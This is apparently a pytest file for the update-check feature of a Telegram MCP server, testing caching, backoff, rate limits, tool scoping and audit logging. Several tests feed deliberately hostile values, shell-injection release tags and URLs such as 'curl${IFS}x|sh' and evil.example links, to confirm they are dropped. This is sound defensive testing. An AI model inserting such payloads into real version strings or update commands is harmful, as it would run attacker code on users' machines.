from __future__ import annotations

import json
import urllib.error
from dataclasses import replace

import pytest
from fastmcp import Client
from fastmcp.exceptions import ToolError
from test_runtime import FixtureAdapter

from zai_telegram import __version__, update_check
from zai_telegram.server import create_server
from zai_telegram.state import StateStore

RELEASE_URL = "https://github.com/zai-one/telegram-mcp/releases/tag/v99.0.0"
WHEEL_URL = "https://github.com/zai-one/telegram-mcp/releases/download/v99.0.0/zai_telegram_mcp-99.0.0-py3-none-any.whl"


def release(tag="v99.0.0", **extra):
    payload = {
        "tag_name": tag,
        "html_url": RELEASE_URL,
        "assets": [{"browser_download_url": WHEEL_URL}],
        **extra,
    }
    return json.dumps(payload).encode()


class FakeGitHub:
    def __init__(self, body=None, error=None):
        self.body, self.error, self.calls = body, error, []

    def __call__(self, url, timeout):
        self.calls.append((url, timeout))
        if self.error:
            raise self.error
        return self.body


@pytest.fixture
def enabled(monkeypatch):
    monkeypatch.delenv("TELEGRAM_MCP_DISABLE_UPDATE_CHECK")
    monkeypatch.setattr(update_check, "_install_kind", lambda: "package")


def test_disabled_by_env_never_fetches():
    fetch = FakeGitHub(release())
    result = update_check.check_for_update(fetch=fetch, force=True)
    assert result["status"] == "disabled" and fetch.calls == []
    assert update_check.cached_update_hint() is None


def test_newer_release_suggests_wheel_command(enabled):
    fetch = FakeGitHub(release())
    result = update_check.check_for_update(fetch=fetch, now=1_000_000)
    assert fetch.calls == [(update_check.LATEST_RELEASE_API, update_check.TIMEOUT_SECONDS)]
    assert fetch.calls[0][1] <= 5
    assert result["current_version"] == __version__
    assert result["latest_version"] == "99.0.0" and result["update_available"] is True
    assert result["status"] == "update_available" and result["source"] == "github"
    assert result["release_notes_url"] == RELEASE_URL
    assert result["update_command"] == f'uv tool install --force "zai-telegram-mcp @ {WHEEL_URL}"'
    assert result["auto_update"] is False


def test_cache_is_reused_for_24_hours(enabled):
    update_check.check_for_update(fetch=FakeGitHub(release()), now=1_000_000)
    later = FakeGitHub(release("v100.0.0"))
    assert update_check.check_for_update(fetch=later, now=1_000_000 + 3600)["source"] == "cache"
    assert later.calls == []
    refreshed = update_check.check_for_update(fetch=later, now=1_000_000 + 25 * 3600)
    assert refreshed["latest_version"] == "100.0.0" and len(later.calls) == 1


def test_offline_degrades_gracefully(enabled):
    result = update_check.check_for_update(
        fetch=FakeGitHub(error=urllib.error.URLError("offline")), now=1_000_000
    )
    assert result["status"] == "unavailable" and result["update_available"] is None
    update_check.check_for_update(fetch=FakeGitHub(release()), force=True, now=1_000_000 + 60)
    stale = update_check.check_for_update(
        fetch=FakeGitHub(error=TimeoutError()), force=True, now=1_000_000 + 120
    )
    assert stale["source"] == "stale_cache" and stale["latest_version"] == "99.0.0"


def test_failed_fetch_is_not_repeated_for_30_minutes(enabled):
    offline = FakeGitHub(error=urllib.error.URLError("offline"))
    for offset in (0, 10, 600, update_check.FAILURE_BACKOFF_SECONDS - 1):
        result = update_check.check_for_update(fetch=offline, now=1_000_000 + offset)
        assert result["status"] == "unavailable" and result["latest_version"] is None
    assert len(offline.calls) == 1
    update_check.refresh_in_background()  # same backoff; would start no thread or fetch
    assert len(offline.calls) == 1
    later = FakeGitHub(release())
    result = update_check.check_for_update(
        fetch=later, now=1_000_000 + update_check.FAILURE_BACKOFF_SECONDS
    )
    assert len(later.calls) == 1 and result["latest_version"] == "99.0.0"


def test_failure_keeps_last_good_result_and_backs_off(enabled):
    update_check.check_for_update(fetch=FakeGitHub(release()), now=1_000_000)
    offline = FakeGitHub(error=TimeoutError())
    expired = 1_000_000 + update_check.CACHE_TTL_SECONDS + 1
    for offset in (0, 5, 300):
        result = update_check.check_for_update(fetch=offline, now=expired + offset)
        assert result["source"] == "stale_cache" and result["latest_version"] == "99.0.0"
    assert len(offline.calls) == 1


def test_force_is_throttled_to_one_fetch_per_minute(enabled):
    fetch = FakeGitHub(release())
    for offset in (0, 1, 30, 59):
        update_check.check_for_update(fetch=fetch, force=True, now=1_000_000 + offset)
    assert len(fetch.calls) == 1
    update_check.check_for_update(fetch=fetch, force=True, now=1_000_000 + 60)
    assert len(fetch.calls) == 2


def test_force_is_throttled_without_a_successful_cache(enabled):
    offline = FakeGitHub(error=urllib.error.URLError("offline"))
    for offset in (0, 20, 59):
        result = update_check.check_for_update(fetch=offline, force=True, now=1_000_000 + offset)
        assert result["status"] == "unavailable"
    assert len(offline.calls) == 1
    update_check.check_for_update(fetch=offline, force=True, now=1_000_000 + 61)
    assert len(offline.calls) == 2


def test_startup_refresh_skips_fresh_cache_and_runs_once_when_due(enabled, monkeypatch):
    started = []

    class Thread:
        def __init__(self, target, name, daemon):
            assert daemon is True
            self.target = target

        def start(self):
            started.append(self.target)

    monkeypatch.setattr(update_check.threading, "Thread", Thread)
    update_check.refresh_in_background()
    assert started == [update_check.check_for_update]
    update_check.check_for_update(fetch=FakeGitHub(release()))
    update_check.refresh_in_background()
    assert len(started) == 1


INJECTED_TAG = 'v9.9.9";curl${IFS}x|sh;"'


def _leaks(value):
    text = json.dumps(value) if not isinstance(value, str) else value
    return any(piece in text for piece in ("curl", "IFS", "|sh", "9.9.9", "evil"))


def test_injected_release_tag_never_reaches_result_or_instructions(enabled, config):
    fetch = FakeGitHub(release(tag=INJECTED_TAG))
    result = update_check.check_for_update(fetch=fetch, force=True, now=1_000_000)
    assert len(fetch.calls) == 1
    assert result["status"] == "unavailable" and result["latest_version"] is None
    assert result["update_command"] is None and not _leaks(result)
    assert update_check.cached_update_hint() is None
    assert not _leaks(update_check.cache_path().read_text(encoding="utf-8"))
    server = create_server(config, transport="stdio", adapter=FixtureAdapter())
    assert server.instructions is None


def test_injected_cache_values_are_dropped_on_read(enabled, config):
    path = update_check.cache_path()
    path.parent.mkdir(parents=True)
    path.write_text(
        json.dumps(
            {
                "checked_at": 1_000_000,
                "attempted_at": 1_000_000,
                "latest_version": INJECTED_TAG,
                "release_url": "https://evil.example/notes",
                "wheel_url": "https://evil.example/a.whl",
            }
        ),
        encoding="utf-8",
    )
    assert update_check.cached_update_hint() is None
    assert create_server(config, transport="stdio", adapter=FixtureAdapter()).instructions is None
    offline = FakeGitHub(error=TimeoutError())
    result = update_check.check_for_update(fetch=offline, now=1_000_000 + 10)
    assert result["status"] == "unavailable" and not _leaks(result)
    # A valid version with hostile URLs keeps only the version, never the URLs.
    hostile_wheel = (
        'https://github.com/zai-one/telegram-mcp/releases/download/v99.0.0/x";curl${IFS}x|sh;".whl'
    )
    path.write_text(
        json.dumps(
            {
                "checked_at": 2_000_000,
                "latest_version": "v99.0.0",
                "release_url": 'https://github.com/zai-one/telegram-mcp/releases/tag/x";curl x|sh;"',
                "wheel_url": hostile_wheel,
            }
        ),
        encoding="utf-8",
    )
    result = update_check.check_for_update(fetch=offline, now=2_000_000 + 10)
    assert len(offline.calls) == 1  # the fresh cache needs no second request
    assert result["latest_version"] == "99.0.0" and not _leaks(result)
    assert result["release_notes_url"] == update_check.RELEASES_URL
    assert result["update_command"].endswith('git+https://github.com/zai-one/telegram-mcp@v99.0.0"')


def test_hostile_release_urls_from_github_are_replaced(enabled):
    body = release(
        html_url='https://github.com/zai-one/telegram-mcp/releases/tag/v99.0.0";curl x|sh;"',
        assets=[
            {
                "browser_download_url": (
                    'https://github.com/zai-one/telegram-mcp/releases/download/v99.0.0/a";curl x|sh;".whl'
                )
            }
        ],
    )
    result = update_check.check_for_update(fetch=FakeGitHub(body), now=1_000_000)
    assert result["latest_version"] == "99.0.0" and "curl" not in json.dumps(result)
    assert result["release_notes_url"] == "https://github.com/zai-one/telegram-mcp/releases/tag/v99.0.0"
    assert "git+https://github.com/zai-one/telegram-mcp@v99.0.0" in result["update_command"]


def test_tag_with_surrounding_whitespace_is_not_a_release():
    assert update_check.parse_version(" v1.2.3") is None
    assert update_check.parse_version("v1.2.3\n") is None
    assert update_check.parse_version("v1.2.3") == (1, 2, 3)


@pytest.mark.parametrize(
    "body",
    [b"not json", b"[]", release(tag="nightly"), b"x" * 2_000_000],
    ids=["not-json", "json-array", "non-version-tag", "oversized"],
)
def test_malformed_responses_are_ignored(enabled, body):
    assert update_check.check_for_update(fetch=FakeGitHub(body))["status"] == "unavailable"


def test_same_version_is_up_to_date_and_untrusted_urls_are_replaced(enabled):
    body = release(
        tag=f"v{__version__}",
        html_url="https://evil.example/x",
        assets=[{"browser_download_url": "https://evil.example/a.whl"}],
    )
    result = update_check.check_for_update(fetch=FakeGitHub(body))
    assert result["status"] == "up_to_date" and result["update_command"] is None
    assert result["release_notes_url"].startswith("https://github.com/zai-one/telegram-mcp/releases/")


def test_git_checkout_and_fallback_commands(monkeypatch):
    monkeypatch.setattr(update_check, "_install_kind", lambda: "git")
    assert update_check.update_command("9.0.0", WHEEL_URL).startswith("git pull --ff-only")
    monkeypatch.setattr(update_check, "_install_kind", lambda: "package")
    assert update_check.update_command("9.0.0", None).endswith(
        'git+https://github.com/zai-one/telegram-mcp@v9.0.0"'
    )


def test_startup_hint_uses_cache_only(enabled, config):
    assert update_check.cached_update_hint() is None
    update_check.check_for_update(fetch=FakeGitHub(release()))
    hint = update_check.cached_update_hint()
    assert hint and "99.0.0" in hint and "telegram_check_update" in hint
    assert create_server(config, transport="stdio", adapter=FixtureAdapter()).instructions == hint


async def test_check_update_tool_is_read_only(enabled, config, monkeypatch):
    fetch = FakeGitHub(release())
    monkeypatch.setattr(update_check, "_default_fetch", fetch)
    async with Client(create_server(config, transport="stdio", adapter=FixtureAdapter())) as client:
        tool = {tool.name: tool for tool in await client.list_tools()}["telegram_check_update"]
        assert tool.annotations.read_only_hint is True
        assert tool.input_schema["properties"] == {"force": {"default": False, "type": "boolean"}}
        result = await client.call_tool("telegram_check_update", {"force": True})
    assert result.data["latest_version"] == "99.0.0" and result.data["update_available"] is True
    assert len(fetch.calls) == 1


async def test_check_update_tool_goes_through_registrar_audit_and_quota(enabled, config, monkeypatch):
    fetch = FakeGitHub(release())
    monkeypatch.setattr(update_check, "_default_fetch", fetch)
    limited = replace(config, rate_limit=1)
    async with Client(create_server(limited, transport="stdio", adapter=FixtureAdapter())) as client:
        await client.call_tool("telegram_check_update", {})
        with pytest.raises(ToolError, match="provider_rate_limited"):
            await client.call_tool("telegram_check_update", {})
    assert len(fetch.calls) == 1
    with StateStore(config).connect() as db:
        audit = [dict(row) for row in db.execute("SELECT tool, outcome FROM telegram_audit")]
    assert audit == [
        {"tool": "telegram_check_update", "outcome": "success"},
        {"tool": "telegram_check_update", "outcome": "error"},
    ]


async def test_check_update_tool_follows_stdio_local_scopes(enabled, config):
    write_only = replace(config, local_scopes=frozenset({"telegram:write"}))
    async with Client(create_server(write_only, transport="stdio", adapter=FixtureAdapter())) as client:
        names = {tool.name for tool in await client.list_tools()}
    assert "telegram_check_update" not in names


async def test_check_update_tool_requires_bound_principal(enabled, config, monkeypatch):
    fetch = FakeGitHub(release())
    monkeypatch.setattr(update_check, "_default_fetch", fetch)
    unbound = replace(config, principal_id="stranger")
    async with Client(create_server(unbound, transport="stdio", adapter=FixtureAdapter())) as client:
        with pytest.raises(ToolError):
            await client.call_tool("telegram_check_update", {})
    assert fetch.calls == []
